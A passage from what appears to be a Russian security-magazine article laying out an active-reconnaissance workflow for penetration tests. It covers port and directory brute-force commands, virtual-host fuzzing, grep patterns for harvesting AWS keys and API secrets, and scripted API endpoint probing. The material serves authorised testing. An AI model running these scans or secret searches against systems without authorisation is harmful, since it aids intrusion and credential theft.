же изучили утекшие учетные данные, данные из Google и различных онлай‐
новых сервисов на предмет потенциальных уязвимостей.
   Конечно, универсальный рабочий процесс — это как единорог, его все
ищут, но никто не видел, но мы постарались приблизиться к этому.
   Собранная информация поможет нам в дальнейшем анализе внешней
инфраструктуры. К концу этого этапа у нас сформировалось базовое пред‐
ставление о цели, и оно станет основой для следующих шагов — активной
разведки и самого тестирования уязвимостей.
  В заключение хочу выразить благодарность сообществу, которое пишет,
собирает и документирует все те замечательные утилиты, которыми мы
с тобой можем пользоваться.
COVERSTORY





Активную разведку проводят при пентесте,
чтобы   узнать   максимум   информации
о цели. При этом допускается, что действия
могут быть замечены — например, занесе‐
ны в логи. На этом  этапе мы соберем             aleksey_vi@bk.rualekvi
информацию о URL и эндпоинтах сервисов
заказчика, определим используемые  тех‐
нологии — в общем, вытащим все, что
поможет нам в продвижении.


Эта статья продолжает цикл, посвященный созданию идеального рабочего
процесса. Эти статьи призваны помочь исследователям и техническим спе‐
циалистам разобраться в последовательности действий, анализе резуль‐
татов и выборе инструментов.
   Дальше будем считать, что пассивную разведку мы уже завершили и у нас
есть определенная информация о цели. Процесс я подробно описывал
в прошлой статье, так что при дальнейшем обсуждении будем исходить
из того, что у нас уже есть некоторые наработки.
   Давай подумаем о предстоящих целях. На этом этапе наша задача сводит‐
ся к следующему:
 • отфильтровать собранные в пассивном режиме URL-адреса;
 • собрать информацию об открытых портах;
 • найти виртуальные хосты;
 • сделать скриншоты веб‑сервисов;
 • дополнить список URL-адресов с помощью брутфорса директорий и поис‐
   ка интересных эндпоинтов;
 • сохранить ответы на запросы по собранным URL и найти в них важную
   информацию;
 • построить список URL-адресов с параметрами;
 • собрать список файлов JavaScript;
 • построить карту веб‑приложений и сервисов в Burp.


ФИЛЬТРУЕМ URL ПО СТАТУС-КОДАМ

Итак, будем считать, что у нас уже есть огромный список уникальных URL
и доменов, собранных пассивно. Чтобы эффективно с ними работать, нужно
отсортировать их по статус‑кодам. Этот шаг я включил в этап Enum, потому
что тут мы уже активно взаимодействуем с целевой инфраструктурой и это
уже не относится к пассивным методам.
   Пример команды:


cat uniq_passive_urls | httpx -mc 200,201,202,204,206,301,302,401,
403,404,405,500,502,503 -o live_passive_url

Основные статус‑коды (на случай, если кто‑то позабыл):
 • 200 OK — страница доступна;
 • 201 Created — ресурс успешно создан сервером (например, при загрузке
   файлов или тестировании API);
 • 202 Accepted — запрос принят, но пока обрабатывается асинхронно;
 • 203 Non-Authoritative Information — сервер отдает модифицированный
   кешированный контент;
 • 204 No Content — запрос выполнен успешно, но в ответе нет содер‐
   жимого;
 • 205 Reset Content — клиенту нужно сбросить представление, например
   очистить форму;
 • 206 Partial Content — сервер предоставляет часть файла по Range ;
 • 301 Moved Permanently / 302 Found — сигнализируют о возможных
   редиректах;
 • 401 Unauthorized — требуется авторизация;
 • 403 Forbidden — доступ запрещен, хотя ресурс существует (полезно
   для обхода ACL);
 • 404 Not Found — ресурс не найден, но иногда через обход можно обна‐
   ружить что‑то интересное;
 • 405 Method Not Allowed — может свидетельствовать о наличии нес‐
   тандартных методов (например, PUT , DELETE );
 • 500 Internal Server Error — указывает на баг в обработке запроса;
 • 502 Bad Gateway / 503 Service Unavailable — проблемы на серверной
   стороне, иногда в тексте ошибки содержится что‑то интересное.

Если у нас большой скоуп и список URL-адресов тоже впечатляюще велик, то
надо использовать трюк с разбивкой на части.
   Команда для разделения большого списка URL на части:


split -l 5000 ../uniq_passive_urls target_part_

Пример команды для поэтапного запуска:


( trap 'pkill -P $$' SIGINT; for file in target_part_*; do httpx
-list "$file" -mc 200,201,202,204,206,301,302,401,403,404,405,500,
502,503 -o "httpx-optimized_${file}.txt" & done; wait )

Команда для объединения нескольких файлов в один файл:


cat httpx-optimized_* | anew live_passive_url

Или оставь только самые важные статус‑коды, например 200, 301, 302, 500,
502 и 503. Ответы на коды 401 и 403 можно будет потом собрать отдельно.


СКАНИРУЕМ ПОРТЫ

Утилита Naabu, думаю, всем знакома (если нет, у нее отличная докумен‐
тация). Здесь я покажу, как запустить сканирование в активном режиме.
  Но сначала подготовим список для сканирования:


cat live_subdomains.txt ip_list_resolved | anew for_port_scan

Почему мы объединяем домены и IP? Это помогает обеспечить максималь‐
ное покрытие при анализе сканерами. Например, сканер может не обна‐
ружить уязвимость по адресу http://1.1.1.1:9443 , но найдет ее на http://
example.com:9443 . Или, если доступ к веб‑сервису через IP заблокирован,
мы сможем просканировать его по домену. От нас никто не уйдет!


naabu -list for_port_scan -verify -ec -retries 1 -p 0-65535
-warm-up-time 0 -c 50 -nmap-cli "nmap -sV -oA nmap-out" -o open_
ports.txt

Если скоуп большой, можем разбить задачу на части и сканировать в мно‐
гопоточном режиме:


split -l 500 ../for_port_scan target_part_

Команда для запуска Naabu на отдельных частях списка IP-адресов:


( trap 'pkill -P $$' SIGINT; for file in target_part_*; do naabu
-silent -list "$file" -verify -ec -retries 1 -p 0-65535 -warm-up-time
0 -c 50 -rate 500 -nmap-cli "nmap -sV -sC -oA nmap-out_${file}" -o
"naabu-optimized_${file}.txt" & done; wait )

Сохрани всё в файл open_ports.txt:


cat optimized_* | anew open_ports.txt


             INFO

                            Если сканируемый скоуп велик, лучше сначала
                           запустить Naabu и передать Nmap файл со спис‐
                     ком портов open_ports.txt, чем пользоваться
                        командами из примеров выше.



ФОРМИРУЕМ СПИСОК ВЕБ-СЕРВИСОВ

Берем список из файла open_ports.txt и передаем его утилите  httpx.
На выходе получаем файл web_services.txt с веб‑сервисами на разных
портах.


cat open_ports.txt | httpx -o web_app.txt

Прежде чем двигаться дальше, разделим текущий список на два отдельных.
Это позволит нам эффективно искать виртуальные хосты — как через привяз‐
ку IP к доменам, так и с помощью брутфорса доменов для конкретного IP-
адреса.
   Команда для создания списка в формате ip:port :


grep -E '^https?://([0-9]{1,3}\.){3}[0-9]{1,3}(:[0-9]+)?$' web_app.
txt > web_app_ip.txt

Команда для формирования списка в формате domain:port :


grep -Ev '^https?://([0-9]{1,3}\.){3}[0-9]{1,3}(:[0-9]+)?$' web_app.
txt > web_app_domain.txt


Важный нюанс
Утилита httpx заменяет порты 80 и 443 префиксами http:// и https:// соот‐
ветственно, оставляя нестандартные порты, такие как 8083, без изменений.
   Чтобы решить эту проблему, можно использовать на этом этапе httprobe,
а затем повторить те же шаги.
   Удаляем префиксы http:// и https:// :


 sed 's|https\?://||' web_app.txt > web_app2


Составляем список доменов:


 grep -Ev '^([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]+$' web_app2 > web_app_
 domain.txt


Составляем список с IP-адресами:


 grep -E '^([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]+$' web_app2 > web_app_
 ip.txt





ОБРАБАТЫВАЕМ СПИСОК ДОМЕНОВ

После этапа пассивной разведки у нас уже есть неплохой список собранных
поддоменов, и теперь пора его обработать. Вот что мы собираемся сделать:
 • собрать список невалидных адресов (понадобится для поиска виртуаль‐
   ных хостов);
 • собрать список адресов, возвращающих коды состояния 401 и 403;
 • собрать список адресов, возвращающих 404.

Допустим, что этот список резолвящихся поддоменов у нас уже есть, ведь мы
решили считать, что этап пассивной разведки уже завершен.
   Осталось собрать список поддоменов, которые не резолвятся.
   Пример команды:


comm -23 <(sort subdomains | uniq) <(sort live_subdomains.txt | uniq)
> not_resolv_subdomain.txt


Коды 401, 403 и 404
Теперь, имея на руках два списка поддоменов, нужно собрать из них те,
которые резолвятся через публичные списки поддоменов и имеют  ста‐
тусы 401, 403 и 404. Это делается для последующего брутфорса и поиска
способов обхода авторизации. Команда ниже сохранит в два файла нужные
адреса со статус‑кодами 401, 403 и 404 для брута.


cat live_subdomain.txt | httpx -mc 401,403 -o 401_403.txt
cat live_subdomain.txt | httpx -mc 404 -o 404.txt

Возникает вопрос: зачем нам два файла, а не один? Все просто: файл со ста‐
тус‑кодами 401 и 403 мы потом дополним и будем пробовать байпасы.
   Итак, списки для байпаса у нас есть, теперь подготовим список для брут‐
форса.


cat 401_403.txt 404.txt | anew for_brute_dir.txt

Ты, возможно, запутался, и это нормально — процесс не из легких. Давай
посмотрим, что у нас получилось:
 • resolv_subdomain.txt ;
 • not_resolv_subdomain.txt ;
 • responses_401_403.txt ;
 • responses_404.txt .


Альтернативы httpx
Если httpx вдруг чем‑то тебя не устраивает или ты сомневаешься в коррек‐
тности его результатов (такое за ним уже замечали), то существуют альтер‐
нативы, которые можно использовать. Давай кратко рассмотрим доступные
варианты.
   Httprobe (веб) — утилита создана нашим любимым tomnomnom, работает
неплохо, но не настолько богата возможностями, как httpx.
   Команда для установки:


go install github.com/tomnomnom/httprobe@master

Пример команды для запуска:


cat subdomains_list | httprobe -c 80 --prefer-https | sort | anew
host_alive

Также существует SubProber, написанный на Python. Его я не тестировал.


ПОИСК ВИРТУАЛЬНЫХ ХОСТОВ

Поиск виртуальных  хостов — слабо документированная тема, и я пока
не встречал полных гайдов и инструкций по их обнаружению. В этом разделе
поделюсь своим подходом к поиску в рамках нашего воркфлоу. Но помни,
это направление требует дальнейших исследований и практических тестов.
   Кратко напомню разницу между поддоменом и виртуальным хостом.
 • Поддомены имеют собственные DNS-записи и могут быть публично раз‐
   решены.
 • Виртуальные хосты — настройка веб‑сервера; доступ к ним организуется
   через  указание  конкретного  IP и передачу  нужного  заголовка Host
   или через запись в файле /etc/hosts .

Виртуальный хостинг часто используется на shared-серверах, когда по одно‐
му IP-адресу отвечает один из нескольких сайтов. Например, один IP может
обслуживать example.com, shop.example.com и hidden.example.com, но не
все из них будут публично резолвиться. Это делает их интересной целью
для исследования.
   Брутим список веб‑приложений по IP-адресам, используя в качестве сло‐
варя неразрешенные поддомены.
   Важно заметить, что по‑хорошему нам следовало бы добавить сюда весь
список доменов, а не только те, что не резолвились. Это позволило бы нам
обнаружить IP-адреса с виртуальными хостами. Однако на практике без авто‐
матизации ты  устанешь  просматривать  результаты  вручную.  Поэтому я
рекомендую сосредоточиться только на нерезолвящихся доменных именах
из заранее подготовленного файла not_resolv_subdomain.txt.


cat web_app_ip.txt | while IFS=":" read -r ip port; do ffuf
-noninteractive -s -t 50 -rate 100 -p 0.2 -w not_resolv_subdomain.
txt -ac -mc all -u "http://$ip:$port/" -H "Host: FUZZ" -H
"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (
KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" -o "vhost_brute_${
ip}_${port}.txt" done

Не забудь потом отредактировать системный файл hosts !
   Брутфорсим список веб‑приложений по доменам, используя в качестве
словаря список поддоменов из SecLists.


cat web_app_domain.txt | while IFS=":" read -r domain port; do ffuf
-noninteractive -s -t 50 -rate 100 -p 0.2 -w /opt/SecLists/Discovery/
DNS/subdomains-top1million-5000.txt -ac -mc all -u "http://$domain:
$port/" -H "Host: FUZZ.$domain" -H "User-Agent: Mozilla/5.0 (X11;
Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.
0 Safari/537.36" -o "vhost_brute_${domain}_${port}.txt" done


РАБОТА СО СПИСКАМИ URL

Брут директорий
Не стоит брутить все подряд — это неэффективно при огромном объеме
задач. Логичнее будет пробрутить те домены, которые возвращают коды сос‐
тояния 401, 403 и 404. Часто таким способом удается выявить ошибки в нас‐
тройках системы доступа. Например, доступ к корню / закрыт, а вот во вло‐
женные директории можно попасть. Подобным образом я обнаружил доступ
к Kibana на одном из сайтов правительства Республики Чехии.


        WWW

                          Готовые словари для перебора поддоменов мож‐
                      но скачать с GitHub. Например, raft-large-files.txt
                      и raft-large-directories.txt .


Ниже — примеры команд для запуска.
   Поиск статуса 200:


(trap 'kill 0' SIGINT; while IFS= read -r url; do target_name=$(echo
$url | sed "s/[^a-zA-Z0-9]/_/g"); echo "Starting feroxbuster for $url
"; ~/feroxbuster -k -r -e -u "$url" -w /path_to_wordlist
--random-agent -s 200 -d 1 --rate-limit 50 --scan-limit 1 -o
"result_brute_dir/${target_name}.txt"; done < brute.txt)

Поиск статусов 401 и 403:


(trap 'kill 0' SIGINT; while IFS= read -r url; do target_name=$(echo
$url | sed "s/[^a-zA-Z0-9]/_/g"); echo "Starting feroxbuster for $url
"; ~/feroxbuster -k -r -e -u "$url" -w /path_to_wordlist
--random-agent -s 401,403 -d 1 --rate-limit 50 --scan-limit 1 -o
"result_brute_dir/${target_name}.txt"; done < brute.txt)

Брутфорс разными методами:


while read -r line ; do ffuf -u "${line}/PATH" -X METHOD -w ~/path_to_
wordlist:PATH -w ~/Documents/wordlist/http_methods:METHOD -mc 200 -o
"results_$(echo ${line} | tr '/:' '__').json" -of json ; done <404.txt

Теперь соберем результаты в один файл. Для этого выбираем только те URL,
в которых найдены директории, и сохраняем их в файл с результатами брут‐
форса директорий.


grep -oriahE "https?://[^"\'> ] +/[^"\'> ]+" * | anew ../brute_res


Поиск эндпоинтов
Katana — один из лучших инструментов для краулинга. Чтобы не перегружать
статью, я не буду подробно описывать значения каждого параметра — ты
можешь изучить их самостоятельно в документации .


cat web_app.txt | while read string; do katana -u "$string" -d 10 -jc
-jsl -f url -kf all -silent -ct 500 -rl 20 | anew urls_active_katana;
done

К этой команде можно добавить статус‑бар, чтобы отслеживать прогресс.
   Как вариант можно попробовать утилиту htcap . Я лично с ней не работаю,
но не исключаю, что она тебе понравится. На вход можно подать файл
с веб‑сервисами web_services.txt.


Сохраняем ответы по URL-адресам
Не забудь собрать все найденные и отсортированные URL в один файл!


cat urls_active_katana brute_res live_passive_url | anew live_url

Это делается, чтобы найти в ответах что‑то интересное.


cat live_url | fff -d 5 -S -o fff_res


           WARNING

                    Не  удаляй уже  обработанные  файлы!  Просто
                       перемещай их в отдельную папку.


Теперь поищем новые адреса в ответах из fff_res , которые относятся
к нашему скоупу и пока отсутствуют в файле url_list .


grep -oriahE "https?://[^"\'> ] + " fff_res | inscope | sort | uniq |
comm -23 - <(sort url_list) | anew url_fff

Важно: команда inscope не видит домены, которые могут передаваться внут‐
ри длинной ссылки на другой домен.
   Как вариант можно использовать небольшой самописный скрипт. Однако
это дополнительная мера, и я бы все равно рекомендовал ориентироваться
на первый вариант. В конце концов, можно просто бегло просмотреть список.


# Извлекаем все URL из fff_res
grep -oriahE "https?://[^"\'> ] + " fff_res | {
  # Читаем URL построчно
  while read -r url; do
    # Проверяем, проходит ли URL через inscope
    if echo "$url" | inscope; then
      echo "$url"
    else
      # Проверяем, содержит ли URL любой домен из scope.txt
      while read -r domain; do
        if echo "$url" | grep -qF "$domain"; then
          echo "$url"
          break
        fi
      # Укажи файл со списком доменов
      done < scope.txt
    fi
  done
} | sort | uniq | comm -23 - <(sort url_list) | anew url_fff

Не забудь добавить найденные URL к существующему списку.


cat url_fff | anew live_url


Анализируем список URL
Grep patterns — это отличная утилита (все того же tomnomnom), которая поз‐
воляет находить в сохраненных ответах веб‑сервера разные интересные дан‐
ные. Очень рекомендую попробовать!
   Можно,  конечно,  использовать и  простой  grep. Ниже  представлены
некоторые команды, но это далеко не полный список.



Много интересного можно найти в репозиториях на GitHub, например:
 • Gf Patterns Collection (emadshanab);
 • GF Patterns (NitinYadav00);
 • GF Patterns (Rix4uni);
 • GF Secrets (Dwisiswant0);
 • GF Patterns (1ndianl33t).



Дальше пройдемся по примерам  того, что может искать GF. По  сути,
это просто регулярки для grep: возможно, кому‑то (как и мне) будет удобно
использовать их вручную, без установки лишнего софта. А в перечисленных
выше репозиториях можно найти еще больше интересных и полезных регэк‐
спов.
   Поиск ключей и секретов AWS:


grep -HanriE "(aws_access|aws_secret|api[_-]
?key|ListBucketResult|S3_ACCESS_KEY|Authorization:|RSA PRIVATE|Index
of|aws_|secret|ssh-rsa AA)" <файл>

Поиск URL-адресов S3:


grep -hrioaE "[a-z0-9.-]+\\.s3\\.amazonaws\\.com|[a-z0-9.-]+\\.s3-[
a-z0-9-]+\\.amazonaws\\.com|[a-z0-9.-]+\\.s3-website.-|//s3\\.
amazonaws\\.com/[a-z0-9._-]+|//s3-[a-z0-9-]+\\.amazonaws\\.com/[
a-z0-9._-]+" <файл>

Поиск глобальных переменных PHP:


grep -HnrE "\\$_(POST|GET|COOKIE|REQUEST|SERVER|FILES)|php://(
input|stdin)" <файл>

Поиск HTML input с типом file:


grep -HnriE "<input[^\>]+type=["']?file["'] ? " <файл>

Поиск LFI/RFI:


grep -HnriE "include\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES)
\[.*\]\s*\)|require\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES)\
[.*\]\s*\)" .

Поиск заголовков HTTP:


grep -hroiE "^< [a-z0-9_\\-]+: .*" <файл>

Поиск опасных функций PHP:


grep -HnriE "^a-z0-9_ ?\\(" <файл>

Поиск популярных фреймворков и сервисов:


grep -HnriE
"django|laravel|symfony|graphite|grafana|X-Drupal-Cache|struts|code
?igniter|cake ?php|grails|elastic ?search|kibana|log
?stash|tomcat|jenkins|hudson|com.atlassian.jira|Apache
Subversion|Chef Server|RabbitMQ Management|Mongo|Travis CI -
Enterprise|BMC Remedy|artifactory" <файл>

Поиск доменов Firebase:


grep -Hnri "firebaseio.com" <файл>

Поиск ключей API и секретов в строках:


grep -harioE "(\\?"| "|%22)[a-z0-9_-]*(api[_-]
?key|S3|aws_|secret|passw|auth)[a-z0-9_-]*(\\?"| "|%22): ?(\\?"|
"|%22)[^"&]+(\\ ? "|" |%22)" <файл>

Поиск сообщений об ошибках:


grep -HnraiE '(Application-Trace|Routing Error|DEBUG"? ?[=:]
?True|Caused by:|stack trace:|Microsoft .NET Framework|Traceback|[
0-9]:in`|#!/us|WebApplicationException|java\.lang\.
|phpinfo|swaggerUi|on line [0-9]|SQLSTATE)' .

Поиск сообщений об ошибках конфигурации и отсутствующих ресурсах:


grep -HnriE "There is no app configured at that
hostname|NoSuchBucket|No Such Account|You're Almost There|a GitHub
Pages site here|There's nothing here|project not found|Your CNAME
settings|InvalidBucketName|PermanentRedirect|The specified bucket
does not exist|Repository not found|Sorry, We Couldn't Find That
Page|The feed has not been found.|The thing you were looking for is
no longer here, or never was|Please renew your subscription|There
isn't a Github Pages site here.|We could not find what you're
looking for.|No settings were found for this company:|No such app|is
not a registered InCloud YouTrack|Unrecognized domain|project not
found|This UserVoice subdomain is currently available!|Do you want
to register|Help Center Closed" <файл>

Поиск ключей AWS:


grep -HanrE "([^A-Z0-9]|^)(
AKIA|A3T|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{12,}" <файл>

Поиск сериализованных данных PHP:


grep -HnrE "a:[0-9]+:{|O:[0-9]+:"|s:[0-9]+:"" <файл>

Поиск заголовков сервера:


grep -hri "server: " <файл>

Поиск email-адресов:


grep -hrioaE "[a-z0-9_/\\.:-]+@[a-z0-9-]+\\.[a-z0-9.-]+" <файл>

Поиск заголовков CORS:


grep -HnriE "Access-Control-Allow" <файл>

Поиск URL-адресов:


grep -oriahE "https?://[^"\'> ] + " <файл>

Поиск закодированных данных:


grep -HnroE "([^A-Za-z0-9+/]|^)(eyJ|YTo|Tzo|PD[89]
|aHR0cHM6L|aHR0cDo|rO0)[%a-zA-Z0-9+/]+={0,2}" <файл>

Поиск ошибок PHP:


grep -HnriE "php warning | php error | fatal error | uncaught
exception | include_path | undefined index | undefined variable | \\
?php | <\\?[^x]|stack trace\\: | expects parameter [0-9]* | Debug
Trace" <файл>

Поиск строк в кавычках:


grep -hroiaE ""[ ^ "]+"| '[^'] + '" <файл>

Поиск IP-адресов:


grep -HnroE "(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){
3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])" <файл>




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИCOVERSTORY
        ACTIVE RECON
        СОСТАВЛЯЕМ ПОШАГОВЫЙ ПЛАН
                 АКТИВНОЙ РАЗВЕДКИ




Поиск настроек cURL:


grep -HnrE "CURLOPT_(
HTTPHEADER|HEADER|COOKIE|RANGE|REFERER|USERAGENT|PROXYHEADER)" <файл>

Поиск функций Go:


grep -HnriE "func [a-z0-9_]+\\(" <файл>

Поиск конфиденциальной информации:


grep -Eo 'https?://[^ ]+\.(
env|yaml|yml|json|xml|log|sql|ini|bak|conf|config|db|dbf|tar|gz|backu
p|swp|old|key|pem|crt|pfx|pdf|xlsx|xls|ppt|pptx)
' <файл>

Сбор уникальных UUID:


grep -Eo '[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][
0-9a-fA-F]{3}-[0-9a-fA-F]{12}' <файл> | sort -u | anew UUID.txt


URL с параметрами
Теперь нужно отфильтровать из собранных пассивно URL-адресов только те,
которые содержат параметры, и записать эти URL в файл. Для этого исполь‐
зуй команду


grep '\?' url_list | anew param_urls


POST-ЗАПРОСЫ

Любая автоматизация, будь то пайплайны или самописные скрипты, с которы‐
ми я сталкивался, всегда касалась только GET-методов. Я нигде не видел
способов автоматизировать проверку параметров в POST-запросах, что,
на мой взгляд, огромное упущение для комьюнити. Ведь в POST-запросах
уязвимостей не меньше, чем в GET. Мой коллега недавно опубликовал в сво‐
ем Telegram-канале метод, с помощью которого все же можно автоматизиро‐
вать это, хоть и не без костылей. Я изучил этот метод и немного адаптировал
под свои нужды.
   Вот простая команда для запуска Katana, которая фильтрует все методы,
кроме GET, и передает их для сканирования dast-шаблонами в Nuclei:


katana -silent -u http://testphp.vulnweb.com -fs fqdn -js-crawl
-jsluice -jsonl -or -ob -automatic-form-fill | jq -r '.request.
method,.request.endpoint,.request.body' | paste - - - | tee katana_
non_get.txt | while read method url body; do
  if [[ "$method" == "GET" ]]; then continue; fi
  nuclei -silent -im openapi -l <(./to_openapi.py "$method" "$url" "
$body") -dast -t /templates/ -proxy http://127.0.0.1:8080 -H
"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/
20100101 Firefox/128.0"
done | tee nuclei_vulns_non_get.txt





                            Пример работы





              Пример содержимого файла katana_non_get.txt

Результаты Nuclei можно при желании экспортировать в Burp, чтобы сразу
проверить, нет ли ложных срабатываний, или уже потом прицельно запускать
конкретные проверки.





Для работы тебе понадобится небольшой Python-скрипт, который любезно
предоставил s0i37.


#!/usr/bin/python3
from urllib.parse import urlparse, parse_qs, unquote
import json
from sys import argv


method = argv[1]
url = argv[2]
body = argv[3]


url = urlparse(url)
url_params = parse_qs(url.query)
body_params = parse_qs(body)
out = json.dumps({
    'servers': [{'url': f'{url.scheme}://{url.netloc}'}],
    'paths': {
        url.path: {
            method: {
                'parameters': [ {'name':param, 'in':'query', 'schema'
:{'type': 'string', 'example': url_params[param][0]}} for param in
url_params ],
                'requestBody': {
                    'required': True,
                    'content': {
                        'application/x-www-form-urlencoded': {
                            'schema': {
                                'type': 'object',
                                'properties': { param: {'type':'
string', 'example':body_params[param][0]} for param in body_params}
                            }
                        }
                    }
                }
            }
        }
    }
})
print(out)


СПИСОК JS-ФАЙЛОВ

После проксирования списка собранных URL в Burp и прокликивания нам
нужно собрать список JS-файлов. Я обычно делаю это прямо в Burp.
   Если скоуп большой и у тебя нет времени прокликать все по отдельности,
можно просто собрать список JS-файлов в терминале. Используй для этого
простую команду:


grep -E -i '\.(
js|mjs|jsx|tsx|ts|vue|svelte|xjs|xjsp|es|es6|cjs|jsp|jsonp|ejs|hbs|as
tro|lit|jsc|jsxp|coffee|purs)(\.
|$)' clear_urls.txt | sort | anew js_list.txt

Если мы работаем с каким‑то веб‑приложением, то удобно собрать JavaScript
прямо со страницы в браузере. Для этого можно использовать команду в кон‐
соли браузера:


javascript:console.log('JavaScript Files:\n' + Array.from(document.
scripts).filter(script => script.src).map(script => script.src).join(
'\n'));


ТЕХНОЛОГИИ

Наверняка ты заметил, что консольных утилит для анализа используемых тех‐
нологий немного. Среди самых популярных браузерных — расширение
Wappalyzer, но в рамках нашего пайплайна оно неудобно. Также хорошо себя
показывает Built With . Однако наилучшим вариантом для нас будет WhatWeb
или httpx. Они менее информативны, но вполне подойдут для создания общей
картины.  Кроме  того, не забывай  обрабатывать и  изучать  результаты
из Censys.
   Пример запуска WhatWeb:


whatweb -i web_services.txt

Пример запуска httpx:


cat web_services.txt | httpx -tech-detect

У Wappalyzer есть и консольная версия — Wappalyzer CLI , аналог браузерного
расширения Wappalyzer. На большом скоупе она мне кажется менее удобной
из‑за меньшей читаемости вывода, чем упомянутые выше  инструменты.
Но знать о ней стоит, она особенно хорошо подходит для точечных проверок.





Эта утилита использует библиотеку Wappalyzer, которая включает в себя
набор правил и шаблонов (фингерпринтов) для распознавания различных
веб‑технологий. В общем, все то же самое, что и в аналогичном браузерном
расширении, но доступно из командной строки.


ЕЩЕ НЕМНОГО ФИЛЬТРУЕМ

Эта глава носит творческий характер, и лучше подходить к решению задач,
описанных в ней, с долей креативности и на основании имеющихся у тебя
на руках данных об используемых технологиях. Здесь я приведу примеры
того, что интересного можно найти в уже собранных данных. Например, мож‐
но поискать в итоговом списке URL-адресов формы авторизации, регистра‐
ции, панели администрирования и прочее.


cat live_urls | grep -i "login" | anew login_urls.txt


cat live_urls | grep -iE "register|signup|sign-up" | anew register_
urls.txt


cat live_urls | grep -iE "admin|dashboard|manage|control" | anew
admin_urls.txt

Скажем, можно найти включенный режим отладки в Symphony:


cat live_urls | grep "/_profiler"

Или, может, проверим, есть ли в скоупе GraphQL?


cat live_urls | grep -iE "graphql|gql|query" | anew graphql_urls.txt

Ты, наверное, уже понял, что это просто примеры, и каждый может дополнить
этот  список  своими  интересными  находками. К  примеру, сюда можно
добавить потенциально интересные файлы — с расширениями xml, json, txt
и прочими. В общем, все, что пожелаешь!


СКРЫТЫЕ ПАРАМЕТРЫ

Я не открою здесь Америку, но не упомянуть об этом в контексте статьи прос‐
то нельзя. Речь идет о поиске скрытых параметров в URL. Иногда разработ‐
чики убирают часть возможностей только с фронтенда, а на бэкенде он оста‐
ется (забыли, не успели — всякое бывает). Для поиска таких случаев сущес‐
твуют специальные утилиты и словари, например Arjun и x8 . Также есть
популярное расширение для Burp — Param  Miner. Среди  параметров,
которые могут встретиться, можно выделить Debug, RoleId или returnUrl. Они
могут привести к включению дебаг‑режима, изменению роли или, например,
к Open Redirect.
  В этом разделе я кратко расскажу про Arjun. Более подробно ты можешь
ознакомиться с ним в документации, но обычно я запускаю его такой коман‐
дой:


arjun -u https://example.com/endpoint.php -oT arjun_output.txt -m
GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-
parameter-names.txt -t 10 --rate-limit 30 --headers "User-Agent:
Mozilla/5.0"

Еще есть флаг -i targets.txt, с помощью которого можно загрузить спи‐
сок целей. Однако помни, что просканировать все подряд вряд ли получится
из‑за ограниченного времени. Так что эту возможность стоит применять ско‐
рее нацеленно, чем массово.
   Если внимательно изучить документацию, то можно узнать, что Arjun умеет
пассивно собирать имена параметров...


ВКРАТЦЕ ОБ API И SWAGGER

Swagger — это инструмент для работы с документацией REST API: он поз‐
воляет просматривать доступные эндпоинты и отправлять к ним запросы пря‐
мо из браузера. Он встречается довольно часто, так что почему бы не поис‐
кать его отдельно в уже собранных URL-адресах?


cat live_urls | grep -iE "(api[-/]doc|apidoc|swagger)[/?]"

Тема с API довольно серьезная, и тут может найтись множество уязвимостей,
поэтому я остановлюсь на ней чуть подробнее.
   Выше мы рассмотрели команду для поиска Swagger в заранее собранном
списке адресов. Окей, допустим, мы его нашли. Что делать дальше?
   Теперь запускаем вот этот скрипт в консоли браузера.


JSON.stringify(
    [...document.querySelectorAll('.opblock-summary')].map(e =>
      e.querySelector('.opblock-summary-path') &&
    [e.querySelector('.opblock-summary-method').innerText, e.
querySelector('.opblock-summary-path').getAttribute('data-path')]
  ).filter(item => item !== null)
)

Он покажет список эндпоинтов и методов.





Запусти Python-скрипт, предварительно скопировав из браузера данные,
которые поместишь в строку endpoints. Затем замени baseURL , указав толь‐
ко доменное имя.


from requests import request
import re


# Скопируй сюда список методов и путей из Swagger и ниже еще пропиши
baseURL
endpoints = [["POST","/applepaysessions"],["GET","/sessions/{
sessionId}/upsales"],["GET","/userinfo"]]


unique_params = []
for i in endpoints:
    match = re.search(r"{([^{}]*)}", i[1])
    if match:
        content = match.group(1)
        unique_params.append(content)
for i in set(unique_params):
    print("url = url.replace('{" + i + "}','ololo')")


bearer = ""
#bearer = "Bearer eyJhbGciO..."


baseURL = "http://example.com"


body={"login":"zastraxyu_bratyxy"}
headers = {'Authorization': bearer}
proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080"
}


for ep in endpoints:
    method = ep[0]
    url = baseURL+ep[1]


    url = url.replace('{login}','dsfdsf')
    url = url.replace('{orgID}','eadf5f91-b4a1-11eb-90fd-9418826ee072
')


    response = request(method, url, headers=headers, data=body,
proxies=proxies, verify=False)


    status_code = response.status_code
    text = response.text[:100]


    print(status_code, method, url, text, '\n-------\n')


print('DONE')

Вот такой результат получится, и с ним можно работать дальше.





Что делать, если Swagger не нашелся? Даже если его не видно, не беда —
собрать  его  можно   самостоятельно  с  помощью   крутой   утилиты
mitmproxy2swagger.  Подробности  по  установке  и  использованию  есть
на GitHub, включая видео с демонстрацией работы. Если ты тестируешь одно
веб‑приложение, ручное нажатие на все кнопки и поля — это путь к качес‐
твенному результату. Если же скоуп большой и приложение не одно, просто
пропусти найденные URL через прокси. Дальше запускай процесс, как опи‐
сано выше.
   Вообще, тестирование API заслуживает отдельной статьи. Существует
масса отличных инструментов, таких как kiterunner и sj , которые стоило бы
рассмотреть. Но мы здесь целимся в универсальный воркфлоу, так что
об этом, возможно, поговорим в другой раз.


СТРОИМ КАРТУ САЙТА

Теперь можем собрать все, что мы тщательно собирали и анализировали.
Проксируем все собранные и отсортированные URL в Burp, чтобы построить
